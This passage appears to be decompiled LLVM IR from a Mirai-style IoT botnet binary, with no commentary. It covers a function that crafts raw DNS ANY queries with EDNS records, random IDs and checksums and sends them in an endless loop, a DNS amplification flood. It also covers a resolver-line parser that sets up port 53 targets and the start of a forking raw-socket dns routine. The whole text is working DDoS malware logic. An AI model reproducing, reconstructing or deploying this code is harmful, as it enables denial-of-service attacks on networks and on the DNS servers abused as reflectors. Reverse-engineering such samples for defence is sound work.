  %v1_10002728 = trunc i32 %v2_1000271c to i16
  %v2_10002728 = load i32, i32* %r9.global-to-local, align 4
  %v3_10002728 = add i32 %v2_10002728, 2
  %v4_10002728 = inttoptr i32 %v3_10002728 to i16*
  store i16 %v1_10002728, i16* %v4_10002728, align 2
  store i32 1, i32* @r3, align 4
  %v1_10002730 = call i32 @htons(i32 1)
  %v1_1000273c = trunc i32 %v1_10002730 to i16
  %v3_1000273c = add i32 %v2_10002508, 32
  %v4_1000273c = inttoptr i32 %v3_1000273c to i16*
  store i16 %v1_1000273c, i16* %v4_1000273c, align 4
  %v3_10002748 = add i32 %v2_10002508, 34
  %v4_10002748 = inttoptr i32 %v3_10002748 to i16*
  store i16 0, i16* %v4_10002748, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_10002754 = add i32 %v2_10002508, 36
  %v4_10002754 = inttoptr i32 %v3_10002754 to i16*
  store i16 0, i16* %v4_10002754, align 4
  store i32 1, i32* @r3, align 4
  %v1_1000275c = call i32 @htons(i32 1)
  %v1_10002768 = trunc i32 %v1_1000275c to i16
  %v3_10002768 = add i32 %v2_10002508, 38
  %v4_10002768 = inttoptr i32 %v3_10002768 to i16*
  store i16 %v1_10002768, i16* %v4_10002768, align 2
  store i32 %v3_10002494, i32* %v3_100025c8, align 4
  store i32 %v3_100024b4, i32* %r9.global-to-local, align 4
  %v1_10002798 = add i32 %v3_100024b4, 4
  %v2_10002798 = inttoptr i32 %v1_10002798 to i32*
  %v3_10002798 = load i32, i32* %v2_10002798, align 4
  %v2_100027a0 = add i32 %v2_10002508, 16
  %v3_100027a0 = inttoptr i32 %v2_100027a0 to i32*
  store i32 %v3_10002798, i32* %v3_100027a0, align 4
  store i32 %v2_10002508, i32* %r9.global-to-local, align 4
  %v3_100027ac = load i16, i16* %v4_10002564, align 2
  %div = udiv i16 %v3_100027ac, 2
  %v1_100027b4 = zext i16 %div to i32
  %v2_100027c4 = bitcast i32* %stack_var_-4692 to i16*
  %v3_100027c4 = call i32 @csum(i16* %v2_100027c4, i32 %v1_100027b4)
  %sext8 = mul i32 %v3_100027c4, 65536
  %v1_100027c8 = sdiv i32 %sext8, 65536
  store i32 %v2_10002508, i32* %r9.global-to-local, align 4
  %v1_100027d0 = trunc i32 %v1_100027c8 to i16
  store i16 %v1_100027d0, i16* %v4_100025b0, align 2
  %v2_10002858 = add i32 %v2_10002508, 40
  %v2_10002868 = ptrtoint i32* %stack_var_-580 to i32
  %v2_10002884 = inttoptr i32 %v2_10002858 to i8*
  %v2_10002904 = ptrtoint i16** %stack_var_-4744 to i32
  %v3_10002ac0 = add i32 %v2_10002508, 24
  %v4_10002ac0 = inttoptr i32 %v3_10002ac0 to i16*
  %v2_10002908 = add i32 %v2_10002904, 97
  %v2_10002928 = add i32 %v2_10002904, 98
  %v2_10002948 = add i32 %v2_10002904, 99
  %v2_10002968 = add i32 %v2_10002904, 100
  %v2_10002988 = add i32 %v2_10002904, 101
  %v2_100029a8 = add i32 %v2_10002904, 102
  %v2_100029c8 = add i32 %v2_10002904, 103
  %v2_100029e8 = add i32 %v2_10002904, 104
  %v2_10002a08 = add i32 %v2_10002904, 105
  %v2_10002a28 = add i32 %v2_10002904, 106
  %v2_10002a48 = add i32 %v2_10002904, 107
  %v2_10002a68 = add i32 %v2_10002904, 52
  br label %dec_label_pc_100027e4

dec_label_pc_100027e4:                            ; preds = %dec_label_pc_10002b90, %dec_label_pc_100024f4
  %stack_var_-4732.0 = phi i32 [ 0, %dec_label_pc_100024f4 ], [ %v1_10002b94, %dec_label_pc_10002b90 ]
  %stack_var_-4736.0 = phi i32 [ 0, %dec_label_pc_100024f4 ], [ %v1_10002a78, %dec_label_pc_10002b90 ]
  %stack_var_-4704.0 = phi i32 [ %v3_100024b4, %dec_label_pc_100024f4 ], [ %v3_10002804, %dec_label_pc_10002b90 ]
  %v3_100027e8 = icmp eq i32 %stack_var_-4732.0, 2
  br i1 %v3_100027e8, label %dec_label_pc_100027f0, label %dec_label_pc_10002800

dec_label_pc_100027f0:                            ; preds = %dec_label_pc_100027e4
  store i32 ptrtoint (i32* @global_var_100027f8.101 to i32), i32* @lr, align 4
  %v1_100027f4 = call i32 @usleep(i32 100)
  br label %dec_label_pc_10002800

dec_label_pc_10002800:                            ; preds = %dec_label_pc_100027e4, %dec_label_pc_100027f0
  %stack_var_-4732.1 = phi i32 [ 0, %dec_label_pc_100027f0 ], [ %stack_var_-4732.0, %dec_label_pc_100027e4 ]
  store i32 %stack_var_-4704.0, i32* %r9.global-to-local, align 4
  %v1_10002804 = add i32 %stack_var_-4704.0, 532
  %v2_10002804 = inttoptr i32 %v1_10002804 to i32*
  %v3_10002804 = load i32, i32* %v2_10002804, align 4
  %v2_1000281c = add i32 %v2_10002858, %stack_var_-4736.0
  %v1_10002824 = add i32 %stack_var_-4736.0, 256
  store i32 %v2_1000281c, i32* %r9.global-to-local, align 4
  store i32 %v2_1000281c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v1_10002824, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000283c.102 to i32), i32* @lr, align 4
  %v0_10002838 = call i32 @__GI_memset()
  %v1_10002864 = add i32 %v3_10002804, 16
  store i32 %v1_10002864, i32* %r9.global-to-local, align 4
  %v2_10002874 = inttoptr i32 %v1_10002864 to i8*
  %v3_10002874 = call i32 @strcpy(i32 %v2_10002868, i8* %v2_10002874)
  %v3_10002884 = call i32 @ChangetoDnsNameFormat(i8* %v2_10002884, i32 %v2_10002868)
  store i32 %v2_10002858, i32* @r3, align 4
  %v0_10002890 = call i32 @__GI_strlen()
  %v2_100028b0 = add i32 %v0_10002890, 41
  store i32 %v2_100028b0, i32* %r9.global-to-local, align 4
  %v2_100028bc = add i32 %v2_100028b0, %v2_10002508
  %v5_100028c0 = inttoptr i32 %v2_100028bc to i16*
  store i16* %v5_100028c0, i16** %stack_var_-4744, align 4
  store i32 255, i32* @r3, align 4
  %v1_100028c8 = call i32 @htons(i32 255)
  %sext9 = mul i32 %v1_100028c8, 65536
  %v1_100028cc = sdiv i32 %sext9, 65536
  %v3_100028d0 = load i16*, i16** %stack_var_-4744, align 4
  %v4_100028d0 = ptrtoint i16* %v3_100028d0 to i32
  store i32 %v4_100028d0, i32* %r9.global-to-local, align 4
  %v1_100028d4 = trunc i32 %v1_100028cc to i16
  store i16 %v1_100028d4, i16* %v3_100028d0, align 2
  store i32 1, i32* @r3, align 4
  %v1_100028dc = call i32 @htons(i32 1)
  %v3_100028e4 = load i16*, i16** %stack_var_-4744, align 4
  %v4_100028e4 = ptrtoint i16* %v3_100028e4 to i32
  %v1_100028e8 = trunc i32 %v1_100028dc to i16
  %v3_100028e8 = add i32 %v4_100028e4, 2
  %v4_100028e8 = inttoptr i32 %v3_100028e8 to i16*
  store i16 %v1_100028e8, i16* %v4_100028e8, align 2
  %v3_10002910 = add i32 %v2_10002908, %v0_10002890
  %v4_10002910 = inttoptr i32 %v3_10002910 to i8*
  store i8 0, i8* %v4_10002910, align 1
  %v3_10002930 = add i32 %v2_10002928, %v0_10002890
  %v4_10002930 = inttoptr i32 %v3_10002930 to i8*
  store i8 0, i8* %v4_10002930, align 1
  %v3_10002950 = add i32 %v2_10002948, %v0_10002890
  %v4_10002950 = inttoptr i32 %v3_10002950 to i8*
  store i8 41, i8* %v4_10002950, align 1
  %v3_10002970 = add i32 %v2_10002968, %v0_10002890
  %v4_10002970 = inttoptr i32 %v3_10002970 to i8*
  store i8 35, i8* %v4_10002970, align 1
  %v3_10002990 = add i32 %v2_10002988, %v0_10002890
  %v4_10002990 = inttoptr i32 %v3_10002990 to i8*
  store i8 40, i8* %v4_10002990, align 1
  %v3_100029b0 = add i32 %v2_100029a8, %v0_10002890
  %v4_100029b0 = inttoptr i32 %v3_100029b0 to i8*
  store i8 0, i8* %v4_100029b0, align 1
  %v3_100029d0 = add i32 %v2_100029c8, %v0_10002890
  %v4_100029d0 = inttoptr i32 %v3_100029d0 to i8*
  store i8 0, i8* %v4_100029d0, align 1
  %v3_100029f0 = add i32 %v2_100029e8, %v0_10002890
  %v4_100029f0 = inttoptr i32 %v3_100029f0 to i8*
  store i8 0, i8* %v4_100029f0, align 1
  %v3_10002a10 = add i32 %v2_10002a08, %v0_10002890
  %v4_10002a10 = inttoptr i32 %v3_10002a10 to i8*
  store i8 0, i8* %v4_10002a10, align 1
  %v3_10002a30 = add i32 %v2_10002a28, %v0_10002890
  %v4_10002a30 = inttoptr i32 %v3_10002a30 to i8*
  store i8 0, i8* %v4_10002a30, align 1
  %v3_10002a50 = add i32 %v2_10002a48, %v0_10002890
  %v4_10002a50 = inttoptr i32 %v3_10002a50 to i8*
  store i8 0, i8* %v4_10002a50, align 1
  %v1_10002a60 = add i32 %v0_10002890, 56
  %v3_10002a70 = add i32 %v2_10002a68, %v1_10002a60
  %v4_10002a70 = inttoptr i32 %v3_10002a70 to i8*
  store i8 0, i8* %v4_10002a70, align 1
  %v1_10002a78 = add i32 %v0_10002890, 16
  store i32 %v3_10002804, i32* %r9.global-to-local, align 4
  %v1_10002a84 = add i32 %v3_10002804, 4
  %v2_10002a84 = inttoptr i32 %v1_10002a84 to i32*
  %v3_10002a84 = load i32, i32* %v2_10002a84, align 4
  store i32 %v3_10002a84, i32* %v3_100027a0, align 4
  %v1_10002aa4 = urem i32 %v1_10002a60, 65536
  store i32 %v1_10002aa4, i32* %r9.global-to-local, align 4
  %fold11 = add i32 %v0_10002890, 36
  %v1_10002aac = urem i32 %fold11, 65536
  store i32 %v1_10002aac, i32* @r3, align 4
  %v1_10002ab4 = call i32 @htons(i32 %v1_10002aac)
  %v1_10002ac0 = trunc i32 %v1_10002ab4 to i16
  store i16 %v1_10002ac0, i16* %v4_10002ac0, align 4
  store i32 %v2_10002508, i32* %r9.global-to-local, align 4
  %v1_10002ae0 = trunc i32 %v1_10002a60 to i16
  store i16 %v1_10002ae0, i16* %v4_10002564, align 2
  %v0_10002ae4 = call i32 @rand_cmwc()
  %v1_10002aec = urem i32 %v0_10002ae4, 65536
  store i32 %v1_10002aec, i32* @r3, align 4
  %v1_10002af4 = call i32 @htons(i32 %v1_10002aec)
  %sext14 = mul i32 %v1_10002af4, 65536
  %v1_10002af8 = sdiv i32 %sext14, 65536
  %v1_10002b00 = trunc i32 %v1_10002af8 to i16
  store i16 %v1_10002b00, i16* %v5_100025e8, align 4
  store i32 %v2_10002508, i32* %r9.global-to-local, align 4
  %v3_10002b0c = load i16, i16* %v4_10002564, align 2
  %div52 = udiv i16 %v3_10002b0c, 2
  %v1_10002b14 = zext i16 %div52 to i32
  %v3_10002b24 = call i32 @csum(i16* %v2_100027c4, i32 %v1_10002b14)
  store i32 %v2_10002508, i32* %r9.global-to-local, align 4
  %v1_10002b30 = trunc i32 %v3_10002b24 to i16
  store i16 %v1_10002b30, i16* %v4_100025b0, align 2
  br label %dec_label_pc_10002b40

dec_label_pc_10002b40:                            ; preds = %dec_label_pc_10002800, %dec_label_pc_10002b40
  %storemerge1617 = phi i32 [ 0, %dec_label_pc_10002800 ], [ %v1_10002b7c, %dec_label_pc_10002b40 ]
  store i32 %v2_10002508, i32* %r9.global-to-local, align 4
  %v3_10002b44 = load i16, i16* %v4_10002564, align 2
  %v4_10002b44 = zext i16 %v3_10002b44 to i32
  store i32 %v4_10002b44, i32* %r9.global-to-local, align 4
  store i32 268446584, i32* @lr, align 4
  %v6_10002b74 = call i32 @sendto(i32 %v3_100024d4, i32 %v2_10002508, i32 %v4_10002b44, i32 0, i32 %v3_10002804, i32 16)
  store i32 %storemerge1617, i32* %r9.global-to-local, align 4
  %v1_10002b7c = add nuw nsw i32 %storemerge1617, 1
  %tmp51 = icmp slt i32 %v1_10002b7c, 25
  br i1 %tmp51, label %dec_label_pc_10002b40, label %dec_label_pc_10002b90

dec_label_pc_10002b90:                            ; preds = %dec_label_pc_10002b40
  store i32 %stack_var_-4732.1, i32* %r9.global-to-local, align 4
  %v1_10002b94 = add i32 %stack_var_-4732.1, 1
  br label %dec_label_pc_100027e4

dec_label_pc_10002ba0:                            ; preds = %entry
  ret i32 %v0_1000246c

; uselistorder directives
  uselistorder i32 %v1_10002aec, { 1, 0 }
  uselistorder i32 %v1_10002aac, { 1, 0 }
  uselistorder i32 %v1_10002a60, { 2, 0, 1 }
  uselistorder i32 %v0_10002890, { 11, 12, 13, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder i32 %v3_10002804, { 0, 3, 2, 4, 1 }
  uselistorder i32 %stack_var_-4732.1, { 1, 0 }
  uselistorder i32 %stack_var_-4704.0, { 1, 0 }
  uselistorder i32 %stack_var_-4736.0, { 1, 0 }
  uselistorder i32 %v2_10002858, { 1, 0, 2 }
  uselistorder i16* %v2_1000266c, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10 }
  uselistorder i32 %v1_10002650, { 1, 0 }
  uselistorder i32 %v1_100025f0, { 1, 0 }
  uselistorder i32 %v2_10002508, { 28, 14, 15, 16, 17, 0, 1, 2, 18, 19, 20, 3, 4, 5, 6, 7, 8, 9, 10, 11, 21, 22, 23, 24, 25, 26, 12, 27, 13, 29 }
  uselistorder i32 %v3_100024b4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4692, { 2, 0, 1, 3 }
  uselistorder i16** %stack_var_-4744, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2, 5, 4 }
  uselistorder label %dec_label_pc_10002b40, { 1, 0 }
  uselistorder label %dec_label_pc_10002800, { 1, 0 }
  uselistorder label %dec_label_pc_100024f4, { 1, 0 }
}

define i32 @ParseResolverLine(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-1052 = alloca i8*, align 4
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-1084 = alloca i8*, align 4
  %stack_var_-539 = alloca i32, align 4
  %stack_var_-1051 = alloca i32, align 4
  %v2_10002be0 = load i8, i8* bitcast (i8** @global_var_1002a5c8.103 to i8*), align 4
  %v3_10002be0 = zext i8 %v2_10002be0 to i32
  %v6_10002be4 = inttoptr i32 %v3_10002be0 to i8*
  store i8* %v6_10002be4, i8** %stack_var_-1084, align 4
  store i8* %v6_10002be4, i8** %stack_var_-1052, align 4
  %v2_10002c40 = ptrtoint i32* %stack_var_-1051 to i32
  store i32 511, i32* %r9.global-to-local, align 4
  store i32 %v2_10002c40, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 511, i32* @r5, align 4
  store i32 268446808, i32* @lr, align 4
  %v0_10002c54 = call i32 @__GI_memset()
  %v2_10002c68 = ptrtoint i32* %stack_var_-539 to i32
  store i32 511, i32* %r9.global-to-local, align 4
  store i32 %v2_10002c68, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 511, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10002c80.104 to i32), i32* @lr, align 4
  %v0_10002c7c = call i32 @__GI_memset()
  store i32 %arg1, i32* @r3, align 4
  %v0_10002d9c5 = call i32 @__GI_strlen()
  store i32 %v0_10002d9c5, i32* %r3.global-to-local, align 4
  %v2_10002da47 = icmp eq i32 %v0_10002d9c5, 0
  br i1 %v2_10002da47, label %dec_label_pc_10002dac, label %dec_label_pc_10002c94.lr.ph

dec_label_pc_10002c94.lr.ph:                      ; preds = %entry
  %v2_10002d10 = ptrtoint i8** %stack_var_-1084 to i32
  %v2_10002d38 = ptrtoint i32* %stack_var_-1096 to i32
  %v2_10002d54 = ptrtoint i8** %stack_var_-1052 to i32
  br label %dec_label_pc_10002c94

dec_label_pc_10002c94:                            ; preds = %dec_label_pc_10002c94.lr.ph, %dec_label_pc_10002d88
  %storemerge411 = phi i32 [ 0, %dec_label_pc_10002c94.lr.ph ], [ %v1_10002d8c, %dec_label_pc_10002d88 ]
  %stack_var_-1092.110 = phi i32 [ 0, %dec_label_pc_10002c94.lr.ph ], [ %stack_var_-1092.0, %dec_label_pc_10002d88 ]
  %v2_10002ca0 = add i32 %storemerge411, %arg1
  store i32 %v2_10002ca0, i32* %r9.global-to-local, align 4
  %v1_10002ca4 = inttoptr i32 %v2_10002ca0 to i8*
  %v2_10002ca4 = load i8, i8* %v1_10002ca4, align 1
  %v3_10002cac = icmp eq i8 %v2_10002ca4, 32
  br i1 %v3_10002cac, label %dec_label_pc_10002cf4, label %dec_label_pc_10002cb4

dec_label_pc_10002cb4:                            ; preds = %dec_label_pc_10002c94
  store i32 %v2_10002ca0, i32* %r9.global-to-local, align 4
  %v2_10002cc4 = load i8, i8* %v1_10002ca4, align 1
  %v3_10002ccc = icmp eq i8 %v2_10002cc4, 10
  br i1 %v3_10002ccc, label %dec_label_pc_10002cf4, label %dec_label_pc_10002cd4

dec_label_pc_10002cd4:                            ; preds = %dec_label_pc_10002cb4
  store i32 %v2_10002ca0, i32* %r9.global-to-local, align 4
  %v2_10002ce4 = load i8, i8* %v1_10002ca4, align 1
  %v3_10002cec = icmp eq i8 %v2_10002ce4, 9
  br i1 %v3_10002cec, label %dec_label_pc_10002cf4, label %dec_label_pc_10002d04

dec_label_pc_10002cf4:                            ; preds = %dec_label_pc_10002cd4, %dec_label_pc_10002cb4, %dec_label_pc_10002c94
  store i32 %stack_var_-1092.110, i32* %r9.global-to-local, align 4
  %v1_10002cf8 = add i32 %stack_var_-1092.110, 1
  br label %dec_label_pc_10002d88

dec_label_pc_10002d04:                            ; preds = %dec_label_pc_10002cd4
  %v3_10002d08 = icmp eq i32 %stack_var_-1092.110, 0
  br i1 %v3_10002d08, label %dec_label_pc_10002d10, label %dec_label_pc_10002d48

dec_label_pc_10002d10:                            ; preds = %dec_label_pc_10002d04
  store i32 %v2_10002d10, i32* @r3, align 4
  %v0_10002d18 = call i32 @__GI_strlen()
  store i32 %v0_10002d18, i32* %r3.global-to-local, align 4
  store i32 %v2_10002ca0, i32* %r9.global-to-local, align 4
  %v2_10002d30 = load i8, i8* %v1_10002ca4, align 1
  %v2_10002d3c = add i32 %v0_10002d18, %v2_10002d38
  store i32 %v2_10002d3c, i32* %r9.global-to-local, align 4
  %v3_10002d40 = add i32 %v2_10002d3c, 12
  %v4_10002d40 = inttoptr i32 %v3_10002d40 to i8*
  store i8 %v2_10002d30, i8* %v4_10002d40, align 1
  br label %dec_label_pc_10002d88

dec_label_pc_10002d48:                            ; preds = %dec_label_pc_10002d04
  %v3_10002d4c = icmp eq i32 %stack_var_-1092.110, 1
  br i1 %v3_10002d4c, label %dec_label_pc_10002d54, label %dec_label_pc_10002d88

dec_label_pc_10002d54:                            ; preds = %dec_label_pc_10002d48
  store i32 %v2_10002d54, i32* @r3, align 4
  %v0_10002d5c = call i32 @__GI_strlen()
  store i32 %v0_10002d5c, i32* %r3.global-to-local, align 4
  store i32 %v2_10002ca0, i32* %r9.global-to-local, align 4
  %v2_10002d74 = load i8, i8* %v1_10002ca4, align 1
  %v2_10002d80 = add i32 %v0_10002d5c, %v2_10002d38
  store i32 %v2_10002d80, i32* %r9.global-to-local, align 4
  %v3_10002d84 = add i32 %v2_10002d80, 44
  %v4_10002d84 = inttoptr i32 %v3_10002d84 to i8*
  store i8 %v2_10002d74, i8* %v4_10002d84, align 1
  br label %dec_label_pc_10002d88

dec_label_pc_10002d88:                            ; preds = %dec_label_pc_10002d48, %dec_label_pc_10002d10, %dec_label_pc_10002cf4, %dec_label_pc_10002d54
  %stack_var_-1092.0 = phi i32 [ %v1_10002cf8, %dec_label_pc_10002cf4 ], [ 0, %dec_label_pc_10002d10 ], [ 1, %dec_label_pc_10002d54 ], [ %stack_var_-1092.110, %dec_label_pc_10002d48 ]
  store i32 %storemerge411, i32* %r9.global-to-local, align 4
  %v1_10002d8c = add i32 %storemerge411, 1
  store i32 %arg1, i32* @r3, align 4
  %v0_10002d9c = call i32 @__GI_strlen()
  store i32 %v0_10002d9c, i32* %r3.global-to-local, align 4
  %v2_10002da4 = icmp ult i32 %v1_10002d8c, %v0_10002d9c
  br i1 %v2_10002da4, label %dec_label_pc_10002c94, label %dec_label_pc_10002dac

dec_label_pc_10002dac:                            ; preds = %entry, %dec_label_pc_10002d88
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10002db0 = load i32, i32* @global_var_10045194.105, align 4
  %v3_10002db4 = icmp eq i32 %v3_10002db0, 0
  store i32 540, i32* @r3, align 4
  br i1 %v3_10002db4, label %dec_label_pc_10002dbc, label %dec_label_pc_10002e88

dec_label_pc_10002dbc:                            ; preds = %dec_label_pc_10002dac
  store i32 268447172, i32* @lr, align 4
  %v0_10002dc0 = call i32 @malloc()
  store i32 %v0_10002dc0, i32* @global_var_10045194.105, align 4
  store i32 %v0_10002dc0, i32* %r9.global-to-local, align 4
  %v2_10002de0 = inttoptr i32 %v0_10002dc0 to i32*
  store i32 0, i32* %v2_10002de0, align 4
  %v1_10002de8 = load i32, i32* %r9.global-to-local, align 4
  %v2_10002de8 = add i32 %v1_10002de8, 4
  %v3_10002de8 = inttoptr i32 %v2_10002de8 to i32*
  store i32 0, i32* %v3_10002de8, align 4
  %v1_10002df0 = load i32, i32* %r9.global-to-local, align 4
  %v2_10002df0 = add i32 %v1_10002df0, 8
  %v3_10002df0 = inttoptr i32 %v2_10002df0 to i32*
  store i32 0, i32* %v3_10002df0, align 4
  %v1_10002df8 = load i32, i32* %r9.global-to-local, align 4
  %v2_10002df8 = add i32 %v1_10002df8, 12
  %v3_10002df8 = inttoptr i32 %v2_10002df8 to i32*
  store i32 0, i32* %v3_10002df8, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10002e00 = load i32, i32* @global_var_10045194.105, align 4
  %v2_10002e04 = ptrtoint i8** %stack_var_-1084 to i32
  store i32 %v2_10002e04, i32* %r3.global-to-local, align 4
  store i32 268447248, i32* @lr, align 4
  %v1_10002e0c = call i32 @inet_addr(i32 %v2_10002e04)
  %v2_10002e14 = add i32 %v3_10002e00, 4
  %v3_10002e14 = inttoptr i32 %v2_10002e14 to i32*
  store i32 %v1_10002e0c, i32* %v3_10002e14, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10002e1c = load i32, i32* @global_var_10045194.105, align 4
  store i32 53, i32* @r3, align 4
  %v1_10002e24 = call i32 @htons(i32 53)
  %v1_10002e2c = trunc i32 %v1_10002e24 to i16
  %v3_10002e2c = add i32 %v3_10002e1c, 2
  %v4_10002e2c = inttoptr i32 %v3_10002e2c to i16*
  store i16 %v1_10002e2c, i16* %v4_10002e2c, align 2
  %v3_10002e34 = load i32, i32* @global_var_10045194.105, align 4
  %v1_10002e38 = add i32 %v3_10002e34, 16
  %v2_10002e3c = ptrtoint i8** %stack_var_-1052 to i32
  store i32 %v2_10002e3c, i32* %r9.global-to-local, align 4
  store i32 %v1_10002e38, i32* %r3.global-to-local, align 4
  %v2_10002e48 = bitcast i8** %stack_var_-1052 to i8*
  %v3_10002e48 = call i32 @strcpy(i32 %v1_10002e38, i8* %v2_10002e48)
  store i32 %v3_10002e48, i32* %r3.global-to-local, align 4
  %v3_10002e50 = load i32, i32* @global_var_10045194.105, align 4
  %v2_10002e58 = add i32 %v3_10002e50, 528
  %v3_10002e58 = inttoptr i32 %v2_10002e58 to i32*
  store i32 %arg2, i32* %v3_10002e58, align 4
  %v3_10002e60 = load i32, i32* @global_var_10045194.105, align 4
  %v2_10002e6c = add i32 %v3_10002e60, 532
  %v3_10002e6c = inttoptr i32 %v2_10002e6c to i32*
  store i32 %v3_10002e60, i32* %v3_10002e6c, align 4
  %v3_10002e74 = load i32, i32* @global_var_10045194.105, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v2_10002e80 = add i32 %v3_10002e74, 536
  %v3_10002e80 = inttoptr i32 %v2_10002e80 to i32*
  store i32 %v3_10002e74, i32* %v3_10002e80, align 4
  br label %dec_label_pc_10002f38

dec_label_pc_10002e88:                            ; preds = %dec_label_pc_10002dac
  store i32 268447376, i32* @lr, align 4
  %v0_10002e8c = call i32 @malloc()
  store i32 %v0_10002e8c, i32* %stack_var_-1096, align 4
  store i32 540, i32* %r9.global-to-local, align 4
  store i32 %v0_10002e8c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 540, i32* @r5, align 4
  store i32 268447408, i32* @lr, align 4
  %v0_10002eac = call i32 @__GI_memset()
  %v2_10002eb0 = ptrtoint i8** %stack_var_-1084 to i32
  store i32 %v2_10002eb0, i32* %r3.global-to-local, align 4
  store i32 268447420, i32* @lr, align 4
  %v1_10002eb8 = call i32 @inet_addr(i32 %v2_10002eb0)
  %v3_10002ec0 = load i32, i32* %stack_var_-1096, align 4
  store i32 %v3_10002ec0, i32* %r9.global-to-local, align 4
  %v2_10002ec4 = add i32 %v3_10002ec0, 4
  %v3_10002ec4 = inttoptr i32 %v2_10002ec4 to i32*
  store i32 %v1_10002eb8, i32* %v3_10002ec4, align 4
  store i32 53, i32* @r3, align 4
  %v1_10002ecc = call i32 @htons(i32 53)
  %v3_10002ed4 = load i32, i32* %stack_var_-1096, align 4
  %v1_10002ed8 = trunc i32 %v1_10002ecc to i16
  %v3_10002ed8 = add i32 %v3_10002ed4, 2
  %v4_10002ed8 = inttoptr i32 %v3_10002ed8 to i16*
  store i16 %v1_10002ed8, i16* %v4_10002ed8, align 2
  %v3_10002edc = load i32, i32* %stack_var_-1096, align 4
  %v1_10002ee0 = add i32 %v3_10002edc, 16
  %v2_10002ee4 = ptrtoint i8** %stack_var_-1052 to i32
  store i32 %v2_10002ee4, i32* %r9.global-to-local, align 4
  store i32 %v1_10002ee0, i32* %r3.global-to-local, align 4
  %v2_10002ef0 = bitcast i8** %stack_var_-1052 to i8*
  %v3_10002ef0 = call i32 @strcpy(i32 %v1_10002ee0, i8* %v2_10002ef0)
  store i32 %v3_10002ef0, i32* %r3.global-to-local, align 4
  %v3_10002ef8 = load i32, i32* @global_var_10045194.105, align 4
  %v3_10002efc = load i32, i32* %stack_var_-1096, align 4
  %v2_10002f00 = add i32 %v3_10002efc, 536
  %v3_10002f00 = inttoptr i32 %v2_10002f00 to i32*
  store i32 %v3_10002ef8, i32* %v3_10002f00, align 4
  %v3_10002f08 = load i32, i32* @global_var_10045194.105, align 4
  %v2_10002f10 = add i32 %v3_10002f08, 528
  %v3_10002f10 = inttoptr i32 %v2_10002f10 to i32*
  store i32 %arg2, i32* %v3_10002f10, align 4
  %v3_10002f18 = load i32, i32* @global_var_10045194.105, align 4
  store i32 %v3_10002f18, i32* %r9.global-to-local, align 4
  %v1_10002f1c = add i32 %v3_10002f18, 532
  %v2_10002f1c = inttoptr i32 %v1_10002f1c to i32*
  %v3_10002f1c = load i32, i32* %v2_10002f1c, align 4
  %v3_10002f20 = load i32, i32* %stack_var_-1096, align 4
  %v2_10002f24 = add i32 %v3_10002f20, 532
  %v3_10002f24 = inttoptr i32 %v2_10002f24 to i32*
  store i32 %v3_10002f1c, i32* %v3_10002f24, align 4
  %v3_10002f2c = load i32, i32* @global_var_10045194.105, align 4
  store i32 %v3_10002f2c, i32* %r9.global-to-local, align 4
  %v3_10002f30 = load i32, i32* %stack_var_-1096, align 4
  %v2_10002f34 = add i32 %v3_10002f2c, 532
  %v3_10002f34 = inttoptr i32 %v2_10002f34 to i32*
  store i32 %v3_10002f30, i32* %v3_10002f34, align 4
  br label %dec_label_pc_10002f38

dec_label_pc_10002f38:                            ; preds = %dec_label_pc_10002dbc, %dec_label_pc_10002e88
  %v0_10002f50 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10002f50

; uselistorder directives
  uselistorder i32 %v2_10002eb0, { 1, 0 }
  uselistorder i32 %v3_10002e74, { 1, 0 }
  uselistorder i32 %v3_10002e60, { 1, 0 }
  uselistorder i32 %v2_10002e04, { 1, 0 }
  uselistorder i32 %stack_var_-1092.110, { 4, 3, 2, 0, 1 }
  uselistorder i32 %storemerge411, { 1, 2, 0 }
  uselistorder i8** %stack_var_-1084, { 2, 1, 0, 3 }
  uselistorder i8** %stack_var_-1052, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %r3.global-to-local, { 10, 11, 1, 2, 3, 4, 5, 7, 6, 8, 9, 0 }
  uselistorder i32 511, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10002f38, { 1, 0 }
  uselistorder label %dec_label_pc_10002dac, { 1, 0 }
  uselistorder label %dec_label_pc_10002d88, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10002c94, { 1, 0 }
}

define i32 @dns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-319 = alloca i32, align 4
  %stack_var_-1376 = alloca i32, align 4
  %stack_var_-1424 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10002f54 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10002f54, i32* %stack_var_-1424, align 4
  %v5_10002f54 = ptrtoint i32* %stack_var_-1424 to i32
  %v1_10002f8c = call i32 @mfork(i32 %arg2)
  %v3_10002f94 = icmp eq i32 %v1_10002f8c, 0
  br i1 %v3_10002f94, label %dec_label_pc_10002f9c, label %dec_label_pc_100033bc

dec_label_pc_10002f9c:                            ; preds = %entry
  store i32 268447660, i32* @lr, align 4
  %v3_10002fa8 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp46 = icmp sgt i32 %v3_10002fa8, -1
  br i1 %tmp46, label %dec_label_pc_10002fc8, label %dec_label_pc_10002fc0

